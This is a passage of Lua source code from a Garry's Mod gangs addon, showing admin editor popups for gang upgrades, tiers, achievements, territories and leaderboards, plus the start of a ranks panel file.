		backLeftPanel.Refresh()
    end

	local actions = {
		[1] = { BRICKS_SERVER.Func.L( "name" ), Material( "materials/bricks_server/name.png" ), function()
			BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "newNameQuery" ), upgradeTable.Name, function( text ) 
				upgradeTable.Name = text
				backLeftPanel.RefreshInfo()
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), false )
		end, "Name" },
		[2] = { BRICKS_SERVER.Func.L( "description" ), Material( "materials/bricks_server/info.png" ), function()
			BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "newDescriptionQuery" ), upgradeTable.Description, function( text ) 
				upgradeTable.Description = text
				backLeftPanel.RefreshInfo()
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), false )
		end, "Description" },
		[3] = { BRICKS_SERVER.Func.L( "icon" ), Material( "materials/bricks_server/icon.png" ), function()
			BRICKS_SERVER.Func.MaterialRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "newIconQuery" ), (upgradeTable.Icon or ""), function( icon ) 
				upgradeTable.Icon = icon
				backLeftPanel.RefreshInfo()
			end, function() end, BRICKS_SERVER.Func.L( "confirm" ), BRICKS_SERVER.Func.L( "cancel" ) )
		end, "Icon" }
	}

    if( devConfigTable.Unlimited ) then
        table.insert( actions, { BRICKS_SERVER.Func.L( "group" ), Material( "materials/bricks_server/group.png" ), function()
			local options = {}
			options["None"] = BRICKS_SERVER.Func.L( "none" )
			for k, v in pairs( (BS_ConfigCopyTable or BRICKS_SERVER.CONFIG).GENERAL.Groups ) do
				options[k] = v[1]
			end
			BRICKS_SERVER.Func.ComboRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "groupRequirementQuery" ), (upgradeTable.Group or ""), options, function( value, data ) 
				if( (BS_ConfigCopyTable or BRICKS_SERVER.CONFIG).GENERAL.Groups[data] ) then
					upgradeTable.Group = value
					backLeftPanel.RefreshInfo()
				elseif( data == "None" ) then
					upgradeTable.Group = nil
					backLeftPanel.RefreshInfo()
				else
					notification.AddLegacy( BRICKS_SERVER.Func.L( "invalidGroup" ), 1, 3 )
				end
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ) )
        end, "Group" } )
        
		table.insert( actions, { BRICKS_SERVER.Func.L( "level" ), Material( "materials/bricks_server/level.png" ), function()
			BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "levelRequirementQuery" ), upgradeTable.Level, function( number ) 
				if( number > 0 ) then
					upgradeTable.Level = number
				else
					upgradeTable.Level = nil
				end
				backLeftPanel.RefreshInfo()
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), true )
		end, "Level" } )

		table.insert( actions, { BRICKS_SERVER.Func.L( "price" ), Material( "materials/bricks_server/currency.png" ), function()
			BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "newPriceQuery" ), upgradeTable.Price, function( text ) 
				upgradeTable.Price = text
				backLeftPanel.RefreshInfo()
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), true )
		end, "Price" } )
		
		table.insert( actions, { BRICKS_SERVER.Func.L( "type" ), Material( "materials/bricks_server/amount.png" ), function()
			local options = {}
			for k, v in pairs( BRICKS_SERVER.DEVCONFIG.GangUpgrades ) do
				if( not v.Unlimited ) then continue end

				options[k] = v.Name
			end

			BRICKS_SERVER.Func.ComboRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "newTypeQuery" ), (upgradeTable.Type or ""), options, function( value, data ) 
				if( options[data] ) then
					upgradeTable.Type = data
					backLeftPanel.RefreshInfo()
					backRightPanel.FillOptions( upgradeTable, actions )
				else
					notification.AddLegacy( BRICKS_SERVER.Func.L( "invalidType" ), 1, 3 )
				end
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ) )
        end, "Type" } )
	end
	
	backRightPanel.FillOptions( upgradeTable, actions )
	backLeftPanel.RefreshInfo()
end

function BRICKS_SERVER.Func.CreateUpgradeTierEditor( oldTierTable, tierKey, upgradeTable, upgradeKey, onSave, onCancel )
	local tierTable = table.Copy( oldTierTable )
	
	local backgroundPanel, backRightPanel, backLeftPanel = BRICKS_SERVER.Func.CreateConfigPopup( onSave, onCancel )

	local reqInfoIcon = Material( "bricks_server/more_24.png" )
	backRightPanel.lastActionFunc = function()
		for k, v in pairs( BRICKS_SERVER.DEVCONFIG.GangUpgrades[upgradeKey or ""].ReqInfo or {} ) do
			local actionButton = vgui.Create( "DButton", backRightPanel )
			actionButton:SetText( "" )
			actionButton:Dock( TOP )
			actionButton:DockMargin( 10, 10, 10, 0 )
			actionButton:SetTall( 40 )
			local changeAlpha = 0
			actionButton.Paint = function( self2, w, h )
				if( self2:IsDown() ) then
					changeAlpha = math.Clamp( changeAlpha+10, 0, 255 )
				elseif( self2:IsHovered() ) then
					changeAlpha = math.Clamp( changeAlpha+10, 0, 255 )
				else
					changeAlpha = math.Clamp( changeAlpha-10, 0, 255 )
				end
				
				draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 2 ) )
		
				surface.SetAlphaMultiplier( changeAlpha/255 )
					draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 5 ) )
				surface.SetAlphaMultiplier( 1 )

				surface.SetDrawColor( BRICKS_SERVER.Func.GetTheme( 6 ) )
				surface.SetMaterial( reqInfoIcon )
				local iconSize = 24
				surface.DrawTexturedRect( (h-iconSize)/2, (h/2)-(iconSize/2), iconSize, iconSize )

				if( v[2] == "bool" ) then
					draw.SimpleText( v[1] .. " - " .. (((tierTable.ReqInfo or {})[k] and BRICKS_SERVER.Func.L( "true" )) or BRICKS_SERVER.Func.L( "false" )), "BRICKS_SERVER_Font25", w/2, h/2, Color( 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				elseif( (tierTable.ReqInfo or {})[k] ) then
					draw.SimpleText( v[1] .. " - " .. (tierTable.ReqInfo or {})[k], "BRICKS_SERVER_Font25", w/2, h/2, Color( 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				else
					draw.SimpleText( v[1], "BRICKS_SERVER_Font25", w/2, h/2, Color( 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				end
			end
			actionButton.DoClick = function()
				if( v[2] == "string" or v[2] == "integer" ) then 
					BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "valueQuery", v[1] ), ((tierTable.ReqInfo or {})[k] or 0), function( text ) 
						tierTable.ReqInfo = tierTable.ReqInfo or {}
						tierTable.ReqInfo[k] = text
						backLeftPanel.RefreshInfo()
					end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), (v[2] == "integer") )
				elseif( v[2] == "bool" ) then 
					tierTable.ReqInfo = tierTable.ReqInfo or {}
					tierTable.ReqInfo[k] = not tierTable.ReqInfo[k]
					backLeftPanel.RefreshInfo()
				elseif( v[2] == "table" and v[3] and BRICKS_SERVER.Func.GetList( v[3] ) ) then 
					BRICKS_SERVER.Func.ComboRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "dataValueQuery" ), ((tierTable.ReqInfo or {})[k] or ""), BRICKS_SERVER.Func.GetList( v[3] ), function( value, data ) 
						if( BRICKS_SERVER.Func.GetList( v[3] )[data] ) then
							tierTable.ReqInfo[k] = data

							if( v[4] ) then
								local newtierTable = v[4]( tierTable ) 
								if( newtierTable ) then
									tierTable = newtierTable
								end
							end
							backLeftPanel.RefreshInfo()
						else
							notification.AddLegacy( BRICKS_SERVER.Func.L( "invalidChoice" ), 1, 3 )
						end
					end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), true )
				end
			end
		end
	end

	if( upgradeTable.Icon ) then
		BRICKS_SERVER.Func.GetImage( upgradeTable.Icon, function( mat ) 
			backLeftPanel.iconMat = mat 
		end )
	end

	function backLeftPanel.RefreshInfo()
		backLeftPanel.Name = BRICKS_SERVER.Func.L( "gangUpgradeTierEdit", (upgradeTable.Name or BRICKS_SERVER.Func.L( "gangNewUpgrade" )), tierKey )

		backLeftPanel.Notices = {}

		table.insert( backLeftPanel.Notices, { DarkRP.formatMoney( tierTable.Price or 0 ), BRICKS_SERVER.DEVCONFIG.BaseThemes.DarkGreen } )

		if( tierTable.Level ) then
			table.insert( backLeftPanel.Notices, { BRICKS_SERVER.Func.L( "levelX", tierTable.Level ) } )
		end

		if( tierTable.Group ) then
			local groupTable
			for k, v in pairs( BRICKS_SERVER.CONFIG.GENERAL.Groups ) do
				if( v[1] == tierTable.Group ) then
					groupTable = v
				end
			end

			if( groupTable ) then
				table.insert( backLeftPanel.Notices, { (groupTable[1] or BRICKS_SERVER.Func.L( "none" )), groupTable[3] } )
			end
		end

		backLeftPanel.Refresh()
    end
    
    local devConfigTable = BRICKS_SERVER.DEVCONFIG.GangUpgrades[upgradeKey or ""]

	local actions = {
		[1] = { BRICKS_SERVER.Func.L( "price" ), Material( "materials/bricks_server/currency.png" ), function()
			BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "newPriceQuery" ), tierTable.Price, function( text ) 
				tierTable.Price = text
				backLeftPanel.RefreshInfo()
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), true )
		end, "Price" },
		[2] = { BRICKS_SERVER.Func.L( "group" ), Material( "materials/bricks_server/group.png" ), function()
			local options = {}
			options["None"] = BRICKS_SERVER.Func.L( "none" )
			for k, v in pairs( (BS_ConfigCopyTable or BRICKS_SERVER.CONFIG).GENERAL.Groups ) do
				options[k] = v[1]
			end
			BRICKS_SERVER.Func.ComboRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "groupRequirementQuery" ), (tierTable.Group or ""), options, function( value, data ) 
				if( (BS_ConfigCopyTable or BRICKS_SERVER.CONFIG).GENERAL.Groups[data] ) then
					tierTable.Group = value
					backLeftPanel.RefreshInfo()
				elseif( data == "None" ) then
					tierTable.Group = nil
					backLeftPanel.RefreshInfo()
				else
					notification.AddLegacy( BRICKS_SERVER.Func.L( "invalidGroup" ), 1, 3 )
				end
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ) )
        end, "Group" },

	}

	table.insert( actions, { BRICKS_SERVER.Func.L( "level" ), Material( "materials/bricks_server/level.png" ), function()
		BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "levelRequirementQuery" ), tierTable.Level, function( text ) 
			tierTable.Level = text
			backLeftPanel.RefreshInfo()
		end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), true )
	end, "Level" } )
	
	backRightPanel.FillOptions( tierTable, actions )
	backLeftPanel.RefreshInfo()
end

function BRICKS_SERVER.Func.CreateAchievementEditor( oldAchievementTable, onSave, onCancel )
	local achievementTable = table.Copy( oldAchievementTable )

	local backgroundPanel, backRightPanel, backLeftPanel = BRICKS_SERVER.Func.CreateConfigPopup( onSave, onCancel )

	local function GetNextQuery( currentQuery, k, v )
		local reqInfo = BRICKS_SERVER.DEVCONFIG.GangRewards[k].ReqInfo

		currentQuery = currentQuery+1

		if( currentQuery > #reqInfo ) then return end

		local reqInfoEntry = reqInfo[currentQuery]

		if( reqInfoEntry[2] == "string" or reqInfoEntry[2] == "integer" ) then 
			BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "valueQuery", reqInfoEntry[1] ), ((achievementTable.Rewards[k] or {})[currentQuery] or 0), function( text ) 
				achievementTable.Rewards[k] = achievementTable.Rewards[k] or {}
				achievementTable.Rewards[k][currentQuery] = text
				backLeftPanel.RefreshInfo()
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), (reqInfoEntry[2] == "integer") )
		elseif( reqInfoEntry[2] == "bool" ) then 
			achievementTable.Rewards[k] = achievementTable.Rewards[k] or {}
			achievementTable.Rewards[k][currentQuery] = not achievementTable.Rewards[k][currentQuery]
			backLeftPanel.RefreshInfo()
		elseif( reqInfoEntry[2] == "table" and reqInfoEntry[3] and BRICKS_SERVER.Func.GetList( reqInfoEntry[3] ) ) then 
			BRICKS_SERVER.Func.ComboRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "dataValueQuery" ), ((achievementTable.Rewards[k] or {})[currentQuery] or ""), BRICKS_SERVER.Func.GetList( reqInfoEntry[3] ), function( value, data ) 
				if( BRICKS_SERVER.Func.GetList( reqInfoEntry[3] )[data] ) then
					achievementTable.Rewards[k][currentQuery] = data

					if( reqInfoEntry[4] ) then
						local newupgradeTable = reqInfoEntry[4]( upgradeTable ) 
						if( newupgradeTable ) then
							upgradeTable = newupgradeTable
						end
					end
					backLeftPanel.RefreshInfo()
				else
					notification.AddLegacy( BRICKS_SERVER.Func.L( "invalidChoice" ), 1, 3 )
				end
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), true )
		end

		GetNextQuery( currentQuery, k, v )
	end

	backRightPanel.lastActionFunc = function( extraActionsCount )
		for k, v in pairs( BRICKS_SERVER.DEVCONFIG.GangAchievements[(achievementTable.Type or "")].ReqInfo or {} ) do
			local actionButton = vgui.Create( "DButton", backRightPanel )
			actionButton:SetText( "" )
			actionButton:Dock( TOP )
			actionButton:DockMargin( 15, 10, 15, 0 )
			actionButton:SetTall( 40 )
			local changeAlpha = 0
			actionButton.Paint = function( self2, w, h )
				if( self2:IsDown() ) then
					changeAlpha = math.Clamp( changeAlpha+10, 0, 255 )
				elseif( self2:IsHovered() ) then
					changeAlpha = math.Clamp( changeAlpha+10, 0, 255 )
				else
					changeAlpha = math.Clamp( changeAlpha-10, 0, 255 )
				end
				
				draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 2 ) )
		
				surface.SetAlphaMultiplier( changeAlpha/255 )
					draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 5 ) )
				surface.SetAlphaMultiplier( 1 )

				if( v[2] == "bool" ) then
					draw.SimpleText( v[1] .. " - " .. (((achievementTable.ReqInfo or {})[k] and "TRUE") or "FALSE"), "BRICKS_SERVER_Font25", w/2, h/2, Color( 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				elseif( (achievementTable.ReqInfo or {})[k] ) then
					draw.SimpleText( v[1] .. " - " .. (achievementTable.ReqInfo or {})[k], "BRICKS_SERVER_Font25", w/2, h/2, Color( 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				else
					draw.SimpleText( v[1], "BRICKS_SERVER_Font25", w/2, h/2, Color( 255, 255, 255 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
				end
			end
			actionButton.DoClick = function()
				if( v[2] == "string" or v[2] == "integer" ) then 
					BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "valueQuery", v[1] ), ((achievementTable.ReqInfo or {})[k] or 0), function( text ) 
						achievementTable.ReqInfo = achievementTable.ReqInfo or {}
						achievementTable.ReqInfo[k] = text
						backLeftPanel.RefreshInfo()
					end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), (v[2] == "integer") )
				elseif( v[2] == "bool" ) then 
					achievementTable.ReqInfo = achievementTable.ReqInfo or {}
					achievementTable.ReqInfo[k] = not achievementTable.ReqInfo[k]
					backLeftPanel.RefreshInfo()
				elseif( v[2] == "table" and v[3] and BRICKS_SERVER.Func.GetList( v[3] ) ) then 
					BRICKS_SERVER.Func.ComboRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "dataValueQuery" ), ((achievementTable.ReqInfo or {})[k] or ""), BRICKS_SERVER.Func.GetList( v[3] ), function( value, data ) 
						if( BRICKS_SERVER.Func.GetList( v[3] )[data] ) then
							achievementTable.ReqInfo[k] = data

							if( v[4] ) then
								local newachievementTable = v[4]( achievementTable ) 
								if( newachievementTable ) then
									achievementTable = newachievementTable
								end
							end
							backLeftPanel.RefreshInfo()
						else
							notification.AddLegacy( BRICKS_SERVER.Func.L( "invalidChoice" ), 1, 3 )
						end
					end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), true )
				end
			end
		end

		backRightPanel.AddAction( { "Rewards", Material( "materials/bricks_server/more_24.png" ), false } )
	
		achievementTable.Rewards = achievementTable.Rewards or {}
		for key, val in pairs( BRICKS_SERVER.DEVCONFIG.GangRewards ) do
			backRightPanel.AddAction( { val.Name, false, function()
				GetNextQuery( 0, key, val )
			end, false, function() return val.FormatDescription( achievementTable.Rewards[key] or {} ) end } )
		end

		return table.Count( BRICKS_SERVER.DEVCONFIG.GangAchievements[(achievementTable.Type or "")].ReqInfo or {} )+1
	end

	local devConfigTable = BRICKS_SERVER.DEVCONFIG.GangAchievements[achievementTable.Type or ""]
	function backLeftPanel.RefreshInfo()
		backLeftPanel:Clear()

		devConfigTable = BRICKS_SERVER.DEVCONFIG.GangAchievements[achievementTable.Type or ""]
        
        if( achievementTable.Icon ) then
            BRICKS_SERVER.Func.GetImage( achievementTable.Icon, function( mat ) 
                backLeftPanel.iconMat = mat 
            end )
        end

		backLeftPanel.Name = achievementTable.Name or BRICKS_SERVER.Func.L( "gangNewAchievement" )

		backLeftPanel.Refresh()
    end

	local actions = {
		[1] = { BRICKS_SERVER.Func.L( "name" ), Material( "materials/bricks_server/name.png" ), function()
			BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "newNameQuery" ), achievementTable.Name, function( text ) 
				achievementTable.Name = text
				backLeftPanel.RefreshInfo()
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), false )
		end, "Name" },
		[2] = { BRICKS_SERVER.Func.L( "description" ), Material( "materials/bricks_server/info.png" ), function()
			BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "newDescriptionQuery" ), achievementTable.Description, function( text ) 
				achievementTable.Description = text
				backLeftPanel.RefreshInfo()
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), false )
		end, "Description" },
		[3] = { BRICKS_SERVER.Func.L( "icon" ), Material( "materials/bricks_server/icon.png" ), function()
			BRICKS_SERVER.Func.MaterialRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "newIconQuery" ), (achievementTable.Icon or ""), function( icon ) 
				achievementTable.Icon = icon
				backLeftPanel.RefreshInfo()
			end, function() end, BRICKS_SERVER.Func.L( "confirm" ), BRICKS_SERVER.Func.L( "cancel" ) )
		end, "Icon" },
		[4] = { BRICKS_SERVER.Func.L( "category" ), Material( "materials/bricks_server/more_24.png" ), function()
			BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "newCategoryQuery" ), achievementTable.Category, function( text ) 
				achievementTable.Category = text
				backLeftPanel.RefreshInfo()
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), false )
		end, "Category" },
	}

	table.insert( actions, { BRICKS_SERVER.Func.L( "type" ), Material( "materials/bricks_server/amount.png" ), function()
		local options = {}
		for k, v in pairs( BRICKS_SERVER.DEVCONFIG.GangAchievements ) do
			options[k] = v.Name
		end

		BRICKS_SERVER.Func.ComboRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "newTypeQuery" ), (achievementTable.Type or ""), options, function( value, data ) 
			if( options[data] ) then
				achievementTable.Type = data
				backLeftPanel.RefreshInfo()
				backRightPanel.FillOptions( achievementTable, actions, table.Count( BRICKS_SERVER.DEVCONFIG.GangRewards ) )
			else
				notification.AddLegacy( BRICKS_SERVER.Func.L( "invalidType" ), 1, 3 )
			end
		end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ) )
	end, "Type" } )
	
	backRightPanel.FillOptions( achievementTable, actions, table.Count( BRICKS_SERVER.DEVCONFIG.GangRewards ) )
	backLeftPanel.RefreshInfo()
end

function BRICKS_SERVER.Func.CreateTerritoryEditor( oldTerritoryTable, onSave, onCancel )
	local territoryTable = table.Copy( oldTerritoryTable )

	local backgroundPanel, backRightPanel, backLeftPanel = BRICKS_SERVER.Func.CreateConfigPopup( onSave, onCancel )

	function backLeftPanel.RefreshInfo()
		backLeftPanel:Clear()

		backLeftPanel.Name = territoryTable.Name or BRICKS_SERVER.Func.L( "gangNewTerritory" )

		backLeftPanel.Refresh()
    end

	local actions = {
		[1] = { BRICKS_SERVER.Func.L( "name" ), Material( "materials/bricks_server/name.png" ), function()
			BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "newNameQuery" ), territoryTable.Name, function( text ) 
				territoryTable.Name = text
				backLeftPanel.RefreshInfo()
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), false )
		end, "Name" },
		[2] = { BRICKS_SERVER.Func.L( "color" ), Material( "materials/bricks_server/color.png" ), function()
			BRICKS_SERVER.Func.ColorRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "newColorQuery" ), territoryTable.Color, function( color ) 
				territoryTable.Color = color
				backLeftPanel.RefreshInfo()
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ) )
		end },
		[3] = { BRICKS_SERVER.Func.L( "gangRewardTime" ), Material( "materials/bricks_server/chance.png" ), function()
			BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "gangRewardTimeQuery" ), territoryTable.RewardTime, function( text ) 
				territoryTable.RewardTime = text
				backLeftPanel.RefreshInfo()
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), true )
		end, "RewardTime" },
		[4] = { BRICKS_SERVER.Func.L( "gangRewards" ), Material( "materials/bricks_server/more_24.png" ), false }
	}

	local function GetNextQuery( currentQuery, k, v )
		local reqInfo = BRICKS_SERVER.DEVCONFIG.GangRewards[k].ReqInfo

		currentQuery = currentQuery+1

		if( currentQuery > #reqInfo ) then return end

		local reqInfoEntry = reqInfo[currentQuery]

		if( reqInfoEntry[2] == "string" or reqInfoEntry[2] == "integer" ) then 
			BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "valueQuery", reqInfoEntry[1] ), ((territoryTable.Rewards[k] or {})[currentQuery] or 0), function( text ) 
				territoryTable.Rewards[k] = territoryTable.Rewards[k] or {}
				territoryTable.Rewards[k][currentQuery] = text
				backLeftPanel.RefreshInfo()
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), (reqInfoEntry[2] == "integer") )
		elseif( reqInfoEntry[2] == "bool" ) then 
			territoryTable.Rewards[k] = territoryTable.Rewards[k] or {}
			territoryTable.Rewards[k][currentQuery] = not territoryTable.Rewards[k][currentQuery]
			backLeftPanel.RefreshInfo()
		elseif( reqInfoEntry[2] == "table" and reqInfoEntry[3] and BRICKS_SERVER.Func.GetList( reqInfoEntry[3] ) ) then 
			BRICKS_SERVER.Func.ComboRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "dataValueQuery" ), ((territoryTable.Rewards[k] or {})[currentQuery] or ""), BRICKS_SERVER.Func.GetList( reqInfoEntry[3] ), function( value, data ) 
				if( BRICKS_SERVER.Func.GetList( reqInfoEntry[3] )[data] ) then
					territoryTable.Rewards[k][currentQuery] = data

					if( reqInfoEntry[4] ) then
						local newupgradeTable = reqInfoEntry[4]( upgradeTable ) 
						if( newupgradeTable ) then
							upgradeTable = newupgradeTable
						end
					end
					backLeftPanel.RefreshInfo()
				else
					notification.AddLegacy( BRICKS_SERVER.Func.L( "invalidChoice" ), 1, 3 )
				end
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), true )
		elseif( reqInfoEntry[2] == "custom" and reqInfoEntry[3] ) then 
			territoryTable.Rewards[k] = territoryTable.Rewards[k] or {}
			reqInfoEntry[3]( territoryTable.Rewards, k, currentQuery, (territoryTable.Rewards[k] or {})[currentQuery] or {} )
		end

		GetNextQuery( currentQuery, k, v )
	end

	territoryTable.Rewards = territoryTable.Rewards or {}
	for k, v in pairs( BRICKS_SERVER.DEVCONFIG.GangRewards ) do
		table.insert( actions, { v.Name, false, function()
			GetNextQuery( 0, k, v )
		end, false, function() return v.FormatDescription( territoryTable.Rewards[k] or {} ) end } )
	end
	
	backRightPanel.FillOptions( territoryTable, actions )
	backLeftPanel.RefreshInfo()
end

function BRICKS_SERVER.Func.CreateLeaderboardEditor( oldLeaderboardTable, onSave, onCancel )
	local leaderboardTable = table.Copy( oldLeaderboardTable )

	local backgroundPanel, backRightPanel, backLeftPanel = BRICKS_SERVER.Func.CreateConfigPopup( onSave, onCancel )

	function backLeftPanel.RefreshInfo()
		backLeftPanel:Clear()

		backLeftPanel.Name = leaderboardTable.Name or BRICKS_SERVER.Func.L( "gangNewLeaderboard" )

		backLeftPanel.Refresh()
    end

	local actions = {
		[1] = { BRICKS_SERVER.Func.L( "name" ), Material( "materials/bricks_server/name.png" ), function()
			BRICKS_SERVER.Func.StringRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "newNameQuery" ), leaderboardTable.Name, function( text ) 
				leaderboardTable.Name = text
				backLeftPanel.RefreshInfo()
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ), false )
		end, "Name" },
		[2] = { BRICKS_SERVER.Func.L( "type" ), Material( "materials/bricks_server/amount.png" ), function()
			local options = {}
			for k, v in pairs( BRICKS_SERVER.DEVCONFIG.GangLeaderboards ) do
				options[k] = v.Name
			end
	
			BRICKS_SERVER.Func.ComboRequest( BRICKS_SERVER.Func.L( "admin" ), BRICKS_SERVER.Func.L( "newTypeQuery" ), (leaderboardTable.Type or ""), options, function( value, data ) 
				if( options[data] ) then
					leaderboardTable.Type = data
					backLeftPanel.RefreshInfo()
					backRightPanel.FillOptions( leaderboardTable, actions )
				else
					notification.AddLegacy( BRICKS_SERVER.Func.L( "invalidType" ), 1, 3 )
				end
			end, function() end, BRICKS_SERVER.Func.L( "ok" ), BRICKS_SERVER.Func.L( "cancel" ) )
		end, "Type" }
	}
	
	backRightPanel.FillOptions( leaderboardTable, actions )
	backLeftPanel.RefreshInfo()
end
--PATH addons/bricks_gangs/lua/bricks_server/modules/gangs/vgui/bricks_server_colsheet_ranks.lua:

local PANEL = {}

AccessorFunc( PANEL, "ActiveButton", "ActiveButton" )

function PANEL:Init()
	self.Navigation = vgui.Create( "bricks_server_scrollpanel", self )
	self.Navigation:Dock( LEFT )
	self.Navigation:SetWidth( 200 )
	self.Navigation.Paint = function( self2, w, h )
		surface.SetAlphaMultiplier( 200/255 )
		draw.RoundedBox( 5, 0, 0, w, h, BRICKS_SERVER.Func.GetTheme( 2 ) )
		surface.SetAlphaMultiplier( 1 )
	end

	self.Content = vgui.Create( "Panel", self )
	self.Content:Dock( FILL )

	self.Items = {}
end

function PANEL:UseButtonOnlyStyle()
	self.ButtonOnly = true
end

function PANEL:AddSheet( label, panel, color )

	if ( !IsValid( panel ) ) then return end

	local Sheet = {}
	Sheet.Button = vgui.Create( "DButton", self.Navigation )
	Sheet.Button.Target = panel
	Sheet.Button:Dock( TOP )
	Sheet.Button:DockMargin( 5, 0, 5, 0 )
	Sheet.Button:SetText( "" )
	Sheet.Button:SetTall( 30 )
	local changeAlpha = 0
	Sheet.Button.Paint = function( self2, w, h )
		local backColor = (isfunction( color ) and color()) or color

		if( self2:IsDown() or self2.m_bSelected ) then
			changeAlpha = math.Clamp( changeAlpha+10, 0, 50 )
		elseif( self2:IsHovered() ) then
			changeAlpha = math.Clamp( changeAlpha+10, 0, 10 )
		else
			changeAlpha = math.Clamp( changeAlpha-10, 0, 50 )
		end

		surface.SetAlphaMultiplier( changeAlpha/255 )
		draw.RoundedBox( 5, 0, 0, w, h, backColor or BRICKS_SERVER.Func.GetTheme( 4 ) )
		surface.SetAlphaMultiplier( 1 )

		draw.SimpleText( ((isfunction( label ) and label()) or label), "BRICKS_SERVER_Font20", 10, h/2, (backColor or BRICKS_SERVER.Func.GetTheme( 5 )), 0, TEXT_ALIGN_CENTER )
	end

	Sheet.Button.DoClick = function( self2 )
		if( not Sheet.Button.m_bSelected ) then
			changeAlpha = 0
		end

		self:SetActiveButton( Sheet.Button )
	end

